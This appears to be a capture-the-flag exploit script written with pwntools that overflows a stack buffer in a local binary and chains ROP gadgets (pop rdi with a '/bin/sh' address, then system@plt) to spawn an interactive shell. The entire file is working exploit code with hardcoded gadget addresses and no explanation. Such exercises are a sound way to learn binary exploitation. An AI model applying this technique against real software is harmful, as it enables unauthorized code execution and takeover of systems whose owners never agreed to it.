import pwn

# io = pwn.remote("127.0.0.1", 9006)
io = pwn.process("./main")

print(io.readuntil("?"))

addr_system_plt = 0x4010e0
addr_binsh = 0x404068
addr_pop_rdi = 0x401433
addr_pop_rsi_pop = 0x401431

s = b"A" * 24
s += pwn.p64(addr_pop_rdi)
s += pwn.p64(addr_binsh)
s += pwn.p64(addr_pop_rsi_pop)
s += pwn.p64(0)
s += pwn.p64(0)
s += pwn.p64(addr_system_plt)

print(s)

io.send(s)

print(io.readline())
io.interactive()